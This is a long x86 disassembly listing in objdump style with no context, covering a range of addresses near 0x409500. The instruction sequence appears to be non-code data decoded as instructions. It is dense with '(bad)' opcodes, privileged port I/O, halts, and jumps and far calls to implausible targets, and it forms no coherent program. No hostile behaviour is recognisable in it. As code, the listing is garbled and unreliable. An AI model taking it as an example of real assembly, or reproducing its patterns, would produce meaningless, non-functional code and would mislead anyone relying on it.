  40953c:	mov    eax,gs:0x8f7833c0
  409542:	or     eax,DWORD PTR ss:[ecx]
  409545:	mov    al,0xc3
  409547:	mov    eax,ds:0x479e8466
  40954c:	xchg   DWORD PTR [edx-0x17],esp
  40954f:	gs aad 0xee
  409552:	pushf  
  409553:	adc    edx,esp
  409555:	dec    edx
  409556:	sub    ah,dh
  409558:	mov    ebp,0x959c0b99
  40955d:	adc    ch,BYTE PTR [eax+0x36]
  409560:	xchg   ebx,eax
  409561:	mov    ch,0xb3
  409563:	scas   eax,DWORD PTR es:[edi]
  409564:	retf   
  409565:	idiv   DWORD PTR [esi-0x5075f7c4]
  40956b:	sti    
  40956c:	call   0xd1fbc36d
  409571:	adc    DWORD PTR [esi+0x58],esp
  409574:	aas    
  409575:	push   esp
  409576:	and    eax,0xa9618cec
  40957b:	or     bl,ah
  40957d:	push   ecx
  40957e:	bound  eax,QWORD PTR [edx]
  409580:	stos   DWORD PTR es:[edi],eax
  409581:	rol    DWORD PTR [esi-0x602b0477],cl
  409587:	cmc    
  409588:	push   edx
  409589:	loope  0x4095ba
  40958b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40958c:	ins    BYTE PTR es:[edi],dx
  40958d:	ja     0x4095c4
  40958f:	div    dh
  409591:	dec    ebx
  409592:	jmp    0x7a59:0x7adcacfd
  409599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40959a:	or     ch,BYTE PTR [edi-0x3ed663e7]
  4095a0:	mov    eax,ds:0x898ba145
  4095a5:	push   eax
  4095a6:	add    dh,al
  4095a8:	cld    
  4095a9:	mov    WORD PTR [eax],ds
  4095ab:	mov    ch,0x7
  4095ad:	adc    edx,edi
  4095af:	mov    esp,0xed015ce9
  4095b4:	jne    0x4095ab
  4095b6:	adc    eax,0xdd3e62bd
  4095bb:	loop   0x409624
  4095bd:	xlat   BYTE PTR ds:[ebx]
  4095be:	push   es
  4095bf:	mov    BYTE PTR [esi+ebp*1+0x443bdf37],bl
  4095c6:	jno    0x4095c2
  4095c8:	aad    0xc6
  4095ca:	je     0x409643
  4095cc:	imul   ebx,DWORD PTR gs:[edx],0xffffff84
  4095d0:	stos   BYTE PTR es:[edi],al
  4095d1:	ja     0x409577
  4095d3:	inc    edi
  4095d4:	pop    eax
  4095d5:	hlt    
  4095d6:	or     al,0x8
  4095d8:	jno    0x4095d5
  4095da:	mov    esi,0x8765a89c
  4095df:	jne    0x4095d8
  4095e1:	jo     0x4095c6
  4095e3:	mov    gs,WORD PTR [esp+eax*4+0x36]
  4095e7:	jno    0x4095dd
  4095e9:	pop    ebp
  4095ea:	push   es
  4095eb:	enter  0x1c74,0x34
  4095ef:	xlat   BYTE PTR ds:[ebx]
  4095f0:	add    DWORD PTR [eax],ebx
  4095f2:	mov    WORD PTR [ebx+edi*8-0x2113607d],gs
  4095f9:	cmp    bl,BYTE PTR ds:0xf60eb1b2
  4095ff:	daa    
  409600:	jnp    0x4095b9
  409602:	sbb    DWORD PTR [ebp+0x202b414f],edx
  409608:	movntps XMMWORD PTR [eax],xmm4
  40960b:	jmp    0x81a13cf1
  409610:	es jp  0x4095eb
  409613:	jp     0x4095f6
  409615:	or     edx,DWORD PTR [ecx-0x30]
  409618:	add    BYTE PTR ds:0x2ef235c1,0x4b
  40961f:	out    dx,eax
  409620:	jmp    0x7eae903a
  409625:	icebp  
  409626:	outs   dx,DWORD PTR ds:[esi]
  409627:	inc    edx
  409628:	aad    0xdc
  40962a:	add    BYTE PTR [eax+0x10f0a726],0x75
  409631:	repz push es
  409633:	jo     0x409604
  409635:	xchg   esp,eax
  409636:	inc    ebp
  409637:	daa    
  409638:	call   0x84cf:0xad2692ae
  40963f:	inc    esi
  409640:	mov    DWORD PTR [ebp+0x371ccb20],edi
  409646:	fwait
  409647:	or     bh,BYTE PTR [ecx+0x1e]
  40964a:	enter  0x1268,0xc4
  40964e:	lds    ebx,FWORD PTR [edx]
  409650:	popa   
  409651:	xor    eax,0xf8cd8a1c
  409656:	shr    DWORD PTR [di],cl
  409659:	fisub  WORD PTR [edx+0x324b4587]
  40965f:	int3   
  409660:	jmp    0x6e3787a4
  409665:	sbb    BYTE PTR ss:[ebp+0x1d723888],al
  40966c:	test   al,0xfd
  40966f:	(bad)  [ebx+0x33]
  409672:	cmp    al,0x43
  409674:	xchg   esi,eax
  409675:	pop    edx
  409676:	imul   esi,DWORD PTR [ebp+ebp*8+0x49],0xd3fb02a1
  40967e:	das    
  40967f:	push   cs
  409680:	push   ds
  409681:	arpl   WORD PTR [ecx+0x76cfc6e0],ax
  409687:	pop    ebx
  409688:	add    eax,0xdd82feb5
  40968d:	jge    0x40967f
  40968f:	pop    edi
  409690:	add    DWORD PTR [edx+0x3714b857],0x69d56e7b
  40969a:	sbb    eax,0xd90d1565
  40969f:	out    0xe,eax
  4096a1:	fwait
  4096a2:	mov    ebp,0x634e226
  4096a7:	repz cdq 
  4096a9:	dec    ecx
  4096aa:	out    0x31,eax
  4096ac:	stc    
  4096ad:	nop
  4096ae:	pop    ecx
  4096af:	inc    esi
  4096b0:	cld    
  4096b1:	imul   ebx,edx,0x7c
  4096b4:	xchg   edx,eax
  4096b5:	jmp    0x686c:0x6364a76
  4096bc:	pop    ds
  4096bd:	imul   edx,DWORD PTR [edx-0x5f6a19e8],0xffffffe9
  4096c4:	sbb    edi,esi
  4096c6:	pop    eax
  4096c7:	jne    0x4096d1
  4096c9:	xchg   esp,eax
  4096ca:	xchg   esi,eax
  4096cb:	popf   
  4096cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096cd:	inc    eax
  4096ce:	mov    ecx,ds
  4096d0:	cld    
  4096d1:	xchg   esi,eax
  4096d2:	pop    esi
  4096d3:	pop    ebx
  4096d4:	mov    edi,0x5b73d743
  4096d9:	into   
  4096da:	(bad)  
  4096db:	in     eax,dx
  4096dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096dd:	jp     0x4096ea
  4096df:	jecxz  0x409715
  4096e1:	aad    0xaf
  4096e3:	xor    dh,0xa
  4096e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e7:	imul   ebp,DWORD PTR [eax-0x760ea981],0x3e
  4096ee:	or     eax,0x4def97f7
  4096f3:	or     eax,0x9dea1241
  4096f8:	inc    edx
  4096f9:	movhps xmm5,QWORD PTR [ebp-0x2b]
  4096fd:	fsub   DWORD PTR [ecx+0x49]
  409700:	or     ch,al
  409702:	imul   esp,ebx,0xffffffd6
  409705:	mov    ebp,0x9326cd79
  40970a:	in     eax,0x8d
  40970c:	retf   
  40970d:	pop    ecx
  40970e:	daa    
  40970f:	ins    BYTE PTR es:[edi],dx
  409710:	adc    eax,0xb97c6ea3
  409715:	sbb    eax,DWORD PTR [esi-0x4d]
  409718:	mov    bl,0x2
  40971a:	mov    esp,0x5e9161d7
  40971f:	lock mov eax,0xbcb70a47
  409725:	adc    bh,dl
  409727:	pop    esi
  409728:	dec    eax
  409729:	mov    ds:0x91498c2c,eax
  40972e:	aaa    
  40972f:	addr16 inc ecx
  409731:	sbb    eax,0x35a0549d
  409736:	mov    edx,DWORD PTR [ecx-0x2901a56c]
  40973c:	sub    al,0x4d
  40973e:	sub    eax,0x14951851
  409743:	ins    BYTE PTR es:[edi],dx
  409744:	cmp    DWORD PTR [esi+0x445dac33],ebx
  40974a:	popa   
  40974b:	mov    bl,0xda
  40974d:	and    bl,BYTE PTR [edi-0x2f48eebd]
  409753:	mov    ds:0xdf65bc5b,eax
  409758:	xchg   edi,eax
  409759:	repnz mov edx,0xba11cb6d
  40975f:	and    eax,0x43890086
  409764:	cmc    
  409765:	repz add dh,BYTE PTR [ecx]
  409768:	cmp    DWORD PTR [edi+0x23],ebp
  40976b:	push   ds
  40976c:	rcr    BYTE PTR [ebx-0x10],cl
  40976f:	mov    al,0x1f
  409771:	repnz in al,0x36
  409774:	out    dx,al
  409775:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409776:	pusha  
  409777:	sar    DWORD PTR [ecx-0x68],1
  40977a:	inc    ebp
  40977b:	add    al,0xe1
  40977d:	adc    al,0xd2
  40977f:	and    cl,BYTE PTR [ebx+0x3d]
  409782:	scas   al,BYTE PTR es:[edi]
  409783:	mov    eax,ds:0x11a6be66
  409788:	inc    ecx
  409789:	cmp    esi,DWORD PTR [edi+eax*8+0x582577b6]
  409790:	cld    
  409791:	pop    ebp
  409792:	or     al,0xb7
  409794:	fadd   st(6),st
  409796:	sbb    eax,0x201c6fb6
  40979b:	xlat   BYTE PTR ds:[ebx]
  40979c:	in     eax,0x7
  40979e:	xchg   ecx,eax
  40979f:	(bad)  
  4097a0:	std    
  4097a1:	fstp   st(3)
  4097a3:	adc    eax,0x361411e0
  4097a8:	add    eax,edi
  4097aa:	loop   0x4097b1
  4097ac:	push   0xfffffffc
  4097ae:	xor    bh,BYTE PTR [ebx-0x184ec4be]
  4097b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b5:	ins    DWORD PTR es:[edi],dx
  4097b6:	sti    
  4097b7:	std    
  4097b8:	adc    BYTE PTR [ecx],bh
  4097ba:	ins    DWORD PTR es:[edi],dx
  4097bb:	pop    esi
  4097bc:	add    DWORD PTR [ebx],ebx
  4097be:	jmp    0x3f3bcff8
  4097c3:	sbb    DWORD PTR [esi+ebx*1-0x54],esp
  4097c7:	dec    esi
  4097c8:	pop    edx
  4097c9:	dec    esi
  4097ca:	dec    edi
  4097cb:	add    eax,0x7b2bf
  4097d0:	push   ebp
  4097d1:	lahf   
  4097d2:	mov    eax,ds:0xa2d3b576
  4097d7:	(bad)  
  4097d8:	icebp  
  4097d9:	dec    ebx
  4097da:	sar    DWORD PTR [edi-0x1da2109d],0xcc
  4097e1:	cmp    ebx,DWORD PTR [ebx]
  4097e3:	ror    edi,0x85
  4097e6:	push   cs
  4097e7:	loope  0x4097dc
  4097e9:	fs pushf 
  4097eb:	cmp    DWORD PTR [esi],edi
  4097ed:	dec    esi
  4097ee:	in     eax,0xa4
  4097f0:	push   ds
  4097f1:	outs   dx,DWORD PTR ds:[esi]
  4097f2:	jmp    0x4097b9
  4097f4:	jnp    0x409853
  4097f6:	idiv   DWORD PTR [eax+0x5cdac368]
  4097fc:	jp     0x409822
  4097fe:	fidivr DWORD PTR [ecx+0x5b7844e2]
  409804:	xor    eax,0xefa179f0
  409809:	and    eax,0xa238a058
  40980e:	test   eax,0xe48373cb
  409813:	pop    ebx
  409814:	fcomp  QWORD PTR [edi]
  409816:	mov    bl,0x62
  409818:	xchg   ebx,eax
  409819:	or     DWORD PTR [eax],esp
  40981b:	enter  0xd82e,0xfc
  40981f:	addr16 add dh,cl
  409822:	jecxz  0x409828
  409824:	ficomp WORD PTR [eax+0x3d]
  409827:	xlat   BYTE PTR ds:[ebx]
  409828:	add    edi,DWORD PTR [edi+0x6cd34282]
  40982e:	adc    edx,DWORD PTR [si]
  409831:	loopne 0x409866
  409833:	sub    edx,DWORD PTR [edi-0x3]
  409836:	xor    ebx,DWORD PTR [edi+edx*8+0x65]
  40983a:	pop    ss
  40983b:	mov    dl,0x29
  40983d:	xor    esp,edx
  40983f:	loope  0x409866
  409841:	add    ebx,0xb1f909e8
  409847:	test   eax,0xb3508295
  40984c:	mov    ebx,0xc105c2b4
  409851:	pop    eax
  409852:	xor    al,0xf6
  409854:	pop    ds
  409855:	fistp  QWORD PTR [ecx-0x1d]
  409858:	sahf   
  409859:	ffree  st(0)
  40985b:	pop    esi
  40985c:	ds pop ecx
  40985e:	push   edi
  40985f:	mov    ch,0xb
  409861:	lods   al,BYTE PTR ds:[esi]
  409862:	mov    eax,ds:0x5f7a9b0f
  409867:	mov    WORD PTR [edi],?
  409869:	imul   edx,DWORD PTR [edi+0x50],0xffffffbb
  40986d:	loope  0x409887
  40986f:	fiadd  DWORD PTR [ebx+eax*2+0x675f94ec]
  409876:	(bad)  
  409877:	lods   al,BYTE PTR ds:[esi]
  409878:	add    edi,DWORD PTR [ebp-0x1f7546]
  40987e:	iret   
  40987f:	arpl   cx,dx
  409881:	jg     0x4098d9
  409883:	jae    0x4098ac
  409885:	jne    0x40982c
  409887:	or     DWORD PTR [edx],ebp
  409889:	ja     0x409854
  40988b:	mov    ah,0xb0
  40988d:	(bad)  
  40988e:	pop    ss
  40988f:	fidiv  WORD PTR [ebp+0x48]
  409892:	mov    ch,0x44
  409894:	or     dh,0x99
  409897:	in     al,0x9e
  409899:	add    BYTE PTR [eax-0x7a],ch
  40989c:	pop    esi
  40989d:	adc    dl,BYTE PTR [eax+0x6a]
  4098a0:	cld    
  4098a1:	popa   
  4098a2:	xor    BYTE PTR [ebp+0xb],0xb0
  4098a6:	mov    dh,0xbf
  4098a8:	sbb    ch,BYTE PTR [edx-0x4c4dd4dc]
  4098ae:	outs   dx,BYTE PTR ds:[esi]
  4098af:	sub    DWORD PTR [eax-0x7ead1196],edi
  4098b5:	cmp    eax,0x46f439c1
  4098ba:	repz mov dl,BYTE PTR [esi-0x42]
  4098be:	fdiv   QWORD PTR [ebx+0x1b187ffa]
  4098c4:	loopne 0x409881
  4098c6:	hlt    
  4098c7:	push   esi
  4098c8:	test   DWORD PTR [ebp-0x14],esi
  4098cb:	imul   ebp,edi,0x391a3f19
  4098d1:	retf   
  4098d2:	or     dl,BYTE PTR [edx]
  4098d4:	xchg   ebp,eax
  4098d5:	iret   
  4098d6:	(bad)  
  4098d7:	(bad)  
  4098d8:	mov    esp,0xc5f75bed
  4098dd:	lods   al,BYTE PTR ds:[esi]
  4098de:	adc    dl,dh
  4098e0:	mov    ds:0x3ea76a63,al
  4098e5:	and    ecx,ecx
  4098e7:	lods   al,BYTE PTR ds:[esi]
  4098e8:	addr16 aaa 
  4098ea:	dec    edi
  4098eb:	push   es
  4098ec:	aad    0xc
  4098ee:	mov    ebx,0x3caf89bd
  4098f3:	les    eax,FWORD PTR [ecx+ecx*8+0x63]
  4098f7:	pusha  
  4098f8:	pop    ebp
  4098f9:	sub    DWORD PTR [esi],esp
  4098fb:	into   
  4098fc:	cmp    ah,ch
  4098fe:	out    0x31,al
  409900:	imul   edx,DWORD PTR [esi+0x15],0x20ad0601
  409907:	mov    ebx,0x1c6c940c
  40990c:	(bad)  
  40990d:	ds dec esi
  40990f:	rol    ah,cl
  409911:	sbb    eax,0x911558da
  409916:	std    
  409917:	ins    DWORD PTR es:[edi],dx
  409918:	int3   
  409919:	xchg   cx,ax
  40991b:	cmp    DWORD PTR [edi-0x1e5e3a66],esi
  409921:	aas    
  409922:	fisubr DWORD PTR [edi-0x18449fe8]
  409928:	or     al,0x88
  40992a:	mov    ecx,0xc7ac7d6a
  40992f:	inc    edi
  409930:	inc    ebp
  409931:	inc    edi
  409932:	test   BYTE PTR cs:[eax-0x19],bl
  409936:	xor    eax,0x13763d90
  40993b:	fstp   QWORD PTR [eax-0x7d5735b6]
  409941:	mov    ecx,0x8d4a7e9f
  409946:	hlt    
  409947:	fwait
  409948:	outs   dx,DWORD PTR ds:[esi]
  409949:	xchg   DWORD PTR [esi],edi
  40994b:	or     ebx,ebp
  40994d:	aaa    
  40994e:	test   al,0xd7
  409950:	and    esp,DWORD PTR [ebp+eax*1+0x191fb23a]
  409957:	lea    eax,ss:[esp+edx*4]
  40995b:	inc    ebx
  40995c:	or     ch,BYTE PTR [ecx+ebp*1+0x45]
  409960:	push   edi
  409961:	push   cs
  409962:	adc    al,0x7
  409964:	mov    edi,0xb5fd7746
  409969:	retf   
  40996a:	shr    ecx,1
  40996c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40996d:	pop    edx
  40996e:	mov    ds:0x7d62ff4,al
  409973:	inc    esi
  409974:	loop   0x409988
  409976:	outs   dx,DWORD PTR ds:[esi]
  409977:	std    
  409978:	ds mov ecx,0x531ae850
  40997e:	int    0xab
  409980:	sbb    BYTE PTR [edx+0x6fda7289],0xcc
  409987:	jl     0x4099cb
  409989:	ja     0x409917
  40998b:	add    BYTE PTR [ebx+0x79],0x22
  40998f:	mov    ch,0x25
  409991:	pop    edx
  409992:	add    ecx,esp
  409994:	int3   
  409995:	inc    ebp
  409996:	pusha  
  409997:	and    eax,0x39f9cde9
  40999c:	sub    BYTE PTR [esi+0x12b0f1e2],bh
  4099a2:	dec    eax
  4099a3:	ss and ch,ah
  4099a6:	sar    dl,0x12
  4099a9:	adc    DWORD PTR [esi+ebx*8-0x1ea7ed7e],0xfffffff2
  4099b1:	hlt    
  4099b2:	jle    0x4099aa
  4099b4:	je     0x40997e
  4099b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099b7:	sub    ebp,DWORD PTR [ebx-0x78d7edf2]
  4099bd:	es xor ch,ah
  4099c0:	xor    dh,BYTE PTR [ebp+0x2]
  4099c3:	jl     0x40994b
  4099c5:	mov    ebx,0x919932b5
  4099ca:	dec    esi
  4099cb:	idiv   DWORD PTR [eax-0x3d]
  4099ce:	or     BYTE PTR [edx-0x78],bh
  4099d1:	test   DWORD PTR [esi-0x284e369f],esi
  4099d7:	pop    ds
  4099d8:	(bad)  
  4099da:	adc    ebx,DWORD PTR [edi+0x77]
  4099dd:	mov    ch,0x0
  4099df:	rcr    dl,0x23
  4099e2:	or     al,0x85
  4099e4:	mov    esp,0xfb8caa74
  4099e9:	(bad)  
  4099ea:	cld    
  4099eb:	pop    ecx
  4099ec:	add    DWORD PTR [edx],0xe2acbc55
  4099f2:	xor    ebx,DWORD PTR [ebp+0x3d]
  4099f5:	int3   
  4099f6:	push   0xe3eb85a
  4099fb:	sub    al,0xf6
  4099fd:	xchg   DWORD PTR [ebx+0x36],esp
  409a00:	out    dx,al
  409a01:	push   ebx
  409a02:	das    
  409a03:	add    al,0x86
  409a05:	xor    al,0x51
  409a07:	test   al,0x85
  409a09:	adc    BYTE PTR [edx-0x6662da6f],cl
  409a0f:	aaa    
  409a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a11:	mov    esi,0x6da37fa9
  409a16:	pop    es
  409a17:	adc    al,0xe4
  409a19:	mov    edx,0x3e6a5a3
  409a1e:	out    dx,al
  409a1f:	adc    BYTE PTR [esi],bh
  409a21:	push   ss
  409a22:	sbb    DWORD PTR [edi-0x29],eax
  409a25:	pop    ebx
  409a26:	pop    ebx
  409a27:	mov    edi,0xe3a59021
  409a2c:	inc    esi
  409a2d:	mov    edi,0x363ab557
  409a32:	or     BYTE PTR [ebx+edi*8],ch
  409a35:	cmp    eax,0x2862e3a2
  409a3a:	lahf   
  409a3b:	mul    BYTE PTR [edi-0x15]
  409a3e:	lahf   
  409a3f:	shr    DWORD PTR [esi-0x427c1a37],cl
  409a45:	lahf   
  409a46:	jno    0x4099dc
  409a48:	pop    es
  409a49:	ror    dl,1
  409a4b:	mov    edi,0x11cc6cf3
  409a50:	inc    eax
  409a51:	mov    ah,0xde
  409a53:	xor    DWORD PTR [ecx],ebx
  409a55:	test   esi,edx
  409a57:	idiv   BYTE PTR [esi+0x6]
  409a5a:	ret    
  409a5b:	mov    edi,0xc8a0adbc
  409a60:	(bad)  
  409a61:	iret   
  409a62:	mov    esp,0x294abbc
  409a67:	pop    esp
  409a68:	xor    ebp,ecx
  409a6a:	(bad)  
  409a6b:	jmp    0x76d63be8
  409a70:	(bad)  
  409a71:	and    eax,0x9deeb102
  409a76:	xor    edx,edx
  409a78:	cmp    al,0xee
  409a7a:	adc    DWORD PTR [edx],0x22
  409a7d:	dec    esi
  409a7e:	dec    edi
  409a7f:	inc    edx
  409a80:	and    eax,0x531dda55
  409a85:	xor    eax,0xe6cb27e1
  409a8a:	sub    BYTE PTR [ebp+edx*2-0x1e],ah
  409a8e:	jmp    0x409a82
  409a90:	test   DWORD PTR [eax-0x3d507ba8],eax
  409a96:	scas   eax,DWORD PTR es:[edi]
  409a97:	fdivr  QWORD PTR [edi+0x5e]
  409a9a:	cmc    
  409a9b:	jb     0x409a44
  409a9d:	xchg   ebx,eax
  409a9e:	outs   dx,DWORD PTR ds:[esi]
  409a9f:	push   edi
  409aa0:	jae    0x409a35
  409aa2:	sahf   
  409aa3:	call   0x2c86198b
  409aa8:	loop   0x409a8d
  409aaa:	sub    BYTE PTR fs:[edi-0x3a],ah
  409aae:	cmp    edx,esi
  409ab0:	inc    edx
  409ab1:	push   ebp
  409ab2:	cmp    BYTE PTR gs:[esi-0x52dfd28f],0x67
  409aba:	mov    WORD PTR [ebp+0x7781fdc1],gs
  409ac0:	cmp    al,0x50
  409ac2:	adc    al,0x93
  409ac4:	aam    0xae
  409ac6:	ret    0xe3d7
  409ac9:	add    edx,DWORD PTR ds:0x81156d8a
  409acf:	jno    0x409ac1
  409ad1:	adc    BYTE PTR [esp+ebx*2],bl
  409ad4:	repnz in al,dx
  409ad6:	and    eax,0x993e7392
  409adb:	mov    bh,BYTE PTR [ebp-0x48]
  409ade:	pop    eax
  409adf:	mov    esp,0xec7256f6
  409ae4:	dec    edi
  409ae5:	sub    DWORD PTR [ebx-0x6dd812b7],esi
  409aeb:	inc    esi
  409aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aed:	xor    eax,DWORD PTR [ecx]
  409aef:	std    
  409af0:	ror    DWORD PTR [ebx+0x56],0xa8
  409af4:	mov    ecx,0xf8a4ded
  409af9:	xor    DWORD PTR [ebp+0x7b],esi
  409afc:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409afe:	das    
  409aff:	push   ebx
  409b00:	xor    esp,DWORD PTR [edx-0x23f74829]
  409b06:	ds ins DWORD PTR es:[edi],dx
  409b08:	aaa    
  409b09:	or     ch,BYTE PTR [edi+0x29]
  409b0c:	jmp    0x409b6a
  409b0e:	adc    bh,BYTE PTR [edi]
  409b10:	sti    
  409b11:	repnz sbb BYTE PTR [edi],0x47
  409b15:	in     eax,0x6b
  409b17:	and    al,0xe8
  409b19:	adc    BYTE PTR [ebx],bl
  409b1b:	popf   
  409b1c:	xor    DWORD PTR [ebp-0x68542eec],edi
  409b22:	hlt    
  409b23:	mov    ds:0x7ef384f1,al
  409b28:	dec    esi
  409b29:	pop    ss
  409b2a:	js     0x409ac0
  409b2c:	hlt    
  409b2d:	add    dl,cl
  409b2f:	or     al,0x4c
  409b31:	mov    bl,0xf1
  409b33:	int3   
  409b34:	push   es
  409b35:	fdivr  st(0),st
  409b37:	push   esp
  409b38:	push   esi
  409b39:	test   al,0xc4
  409b3b:	sub    bh,ch
  409b3d:	jg     0x409b67
  409b3f:	xor    DWORD PTR [ecx],ebx
  409b41:	les    ecx,FWORD PTR gs:[edi]
  409b44:	call   0xbd8abb08
  409b49:	pop    edx
  409b4a:	out    0xf5,eax
  409b4c:	cmp    BYTE PTR [esi-0x42369f0a],dh
  409b52:	sbb    DWORD PTR [edi+0x38b1a060],edi
  409b58:	ins    BYTE PTR es:[edi],dx
  409b59:	inc    ecx
  409b5a:	lds    ebp,FWORD PTR [esi]
  409b5c:	jmp    0xb4e3:0x7d8ece5
  409b63:	xchg   ecx,eax
  409b64:	lock xchg ebp,eax
  409b66:	ror    BYTE PTR [eax+0xd],cl
  409b69:	push   edi
  409b6a:	int3   
  409b6b:	xchg   edi,eax
  409b6c:	jne    0x409bb2
  409b6e:	popa   
  409b6f:	(bad)  
  409b70:	shr    BYTE PTR [eax+0x37],0xae
  409b74:	mov    bh,0x4e
  409b76:	xchg   DWORD PTR [ebp-0x792258f6],ebp
  409b7c:	sbb    eax,0xdec128a9
  409b81:	ret    0xfc93
  409b84:	retf   
  409b85:	push   ecx
  409b86:	sub    DWORD PTR [edx+0x185003fe],ecx
  409b8c:	sahf   
  409b8d:	cld    
  409b8e:	std    
  409b8f:	sub    al,0x35
  409b91:	data16 add al,0x36
  409b94:	jl     0x409bb2
  409b96:	ins    BYTE PTR es:[edi],dx
  409b97:	inc    ebx
  409b98:	or     dl,BYTE PTR [esi+ebp*4]
  409b9b:	add    esi,0x7d
  409b9e:	ret    0x4013
  409ba1:	loopne 0x409b47
  409ba3:	ja     0x409bbf
  409ba5:	fstp   TBYTE PTR [ecx]
  409ba7:	pop    ds
  409ba8:	nop
  409ba9:	inc    ebp
  409baa:	idiv   bh
  409bac:	enter  0x122,0x49
  409bb0:	(bad)  
  409bb2:	in     eax,dx
  409bb3:	(bad)  
  409bb4:	ins    BYTE PTR es:[edi],dx
  409bb5:	and    DWORD PTR [ebx-0x4f],edi
  409bb8:	pop    edx
  409bb9:	sbb    dl,al
  409bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bbc:	repnz mov ebp,0x88e1a267
  409bc2:	aam    0x47
  409bc4:	ror    BYTE PTR [edx],0xf4
  409bc7:	jb     0x409b6f
  409bc9:	ds push edx
  409bcb:	not    BYTE PTR [esi]
  409bcd:	std    
  409bce:	(bad)  
  409bcf:	mov    al,0x25
  409bd1:	sub    ch,BYTE PTR [edi]
  409bd3:	add    ch,BYTE PTR [edi]
  409bd5:	ffree  st(1)
  409bd7:	dec    eax
  409bd8:	push   cs
  409bd9:	cmp    dh,bl
  409bdb:	jae    0x409bee
  409bdd:	sub    al,BYTE PTR [ebp-0x1ef1f674]
  409be3:	or     dh,cl
  409be5:	pop    eax
  409be6:	(bad)  [edx+0x2486351]
  409bec:	inc    eax
  409bed:	adc    ch,bh
  409bef:	jge    0x409bc2
  409bf1:	push   ds
  409bf2:	cmp    al,0x38
  409bf5:	dec    ecx
  409bf6:	je     0x409bb5
  409bf8:	mov    esi,0x85cb0e4d
  409bfd:	or     ch,ah
  409bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c00:	sub    al,0x24
  409c02:	(bad)  
  409c03:	fnstcw WORD PTR [ecx+0x6f]
  409c06:	pop    edi
  409c07:	cmc    
  409c08:	cmp    ch,BYTE PTR [edi-0x21]
  409c0b:	mov    ds:0xd0f73716,eax
  409c10:	xchg   ebx,eax
  409c11:	repnz bound ebp,QWORD PTR ss:[edi+0x3]
  409c16:	mov    dh,0x29
  409c18:	imul   edi,DWORD PTR [edx-0x4cc1a8d4],0xffffffea
  409c1f:	jae    0x409c79
  409c21:	mov    al,ds:0xb461255c
  409c26:	jle    0x409c67
  409c28:	xor    ebp,ebx
  409c2a:	or     BYTE PTR [ecx+0x7968e99e],dh
  409c30:	cmc    
  409c31:	retf   
  409c32:	xchg   DWORD PTR [ecx],esp
  409c34:	cwde   
  409c35:	push   ds
  409c36:	test   al,0x4a
  409c38:	outs   dx,BYTE PTR ds:[esi]
  409c39:	xchg   esi,eax
  409c3a:	ret    
  409c3b:	jg     0x409bc9
  409c3d:	pop    ecx
  409c3e:	aad    0x4c
  409c40:	or     ebx,0x55b11f5
  409c46:	out    dx,al
  409c47:	mov    ebx,0x1e8ee194
  409c4c:	mov    BYTE PTR [eax+0x64],cl
  409c4f:	inc    ebx
  409c50:	mov    eax,ds:0x9f00d43
  409c55:	idiv   ecx
  409c57:	repz in eax,0xa8
  409c5a:	sub    eax,0x6ee86fef
  409c5f:	out    0x64,al
  409c61:	push   eax
  409c62:	sbb    eax,DWORD PTR [edx+0x232d1e7d]
  409c68:	into   
  409c69:	sub    bh,BYTE PTR [edx-0x3d]
  409c6c:	jp     0x409c7e
  409c6e:	call   0xbc01:0x2214aa92
  409c75:	repz inc ebp
  409c77:	or     BYTE PTR [ebp+0x209740ab],ah
  409c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7e:	test   DWORD PTR [ebx],esp
  409c80:	lds    ebx,FWORD PTR ds:0x78c02f90
  409c86:	mov    dh,0x9f
  409c88:	dec    esi
  409c89:	leave  
  409c8a:	dec    eax
  409c8b:	xor    ah,BYTE PTR [ebx+0x2e750988]
  409c91:	imul   edi,DWORD PTR ds:0xaa774fe4,0x4a1725ff
  409c9b:	ja     0x409cb4
  409c9d:	lds    edi,FWORD PTR ds:0xd22c76b2
  409ca3:	cwde   
  409ca4:	outs   dx,DWORD PTR ds:[esi]
  409ca5:	and    DWORD PTR [edi-0x7f],edi
  409ca8:	mov    ebp,0xf630622f
  409cad:	push   es
  409cae:	leave  
  409caf:	sbb    DWORD PTR [esi],0xffffffa0
  409cb2:	sahf   
  409cb3:	jne    0xcd6746f4
  409cb9:	xor    cl,bh
  409cbb:	call   0x30d3:0x73216204
  409cc2:	outs   dx,BYTE PTR ds:[esi]
  409cc3:	mov    ah,0xaf
  409cc5:	bound  esp,QWORD PTR [ebx-0x7b]
  409cc8:	pop    ss
  409cc9:	(bad)  
  409cca:	out    0x9,al
  409ccc:	sahf   
  409ccd:	pop    esi
  409cce:	dec    edi
  409ccf:	xor    ecx,DWORD PTR [edx+0x5e]
  409cd2:	mov    bl,0xa1
  409cd4:	pop    ebx
  409cd5:	jmp    0x5a95:0x2c8c0252
  409cdc:	jge    0x409c6f
  409cde:	test   BYTE PTR [ecx],ah
  409ce0:	ss in  eax,dx
  409ce2:	aaa    
  409ce3:	icebp  
  409ce4:	or     DWORD PTR [esi+ecx*4+0x70],ebx
  409ce8:	pop    edi
  409ce9:	popf   
  409cea:	pusha  
  409ceb:	push   cs
  409cec:	sahf   
  409ced:	dec    esi
  409cee:	xlat   BYTE PTR ds:[ebx]
  409cef:	fptan  
  409cf1:	dec    ebp
  409cf2:	daa    
  409cf3:	xor    dh,ch
  409cf5:	mov    eax,0x338b7248
  409cfa:	(bad)  
  409cfb:	sub    al,0x40
  409cfd:	rol    DWORD PTR [eax+0x2a],cl
  409d00:	icebp  
  409d01:	mov    al,0x44
  409d03:	out    0x40,al
  409d05:	call   0x135c128d
  409d0a:	in     al,0xa
  409d0c:	cmp    DWORD PTR [ecx+edi*2],ebp
  409d0f:	adc    eax,0x89f3bfa7
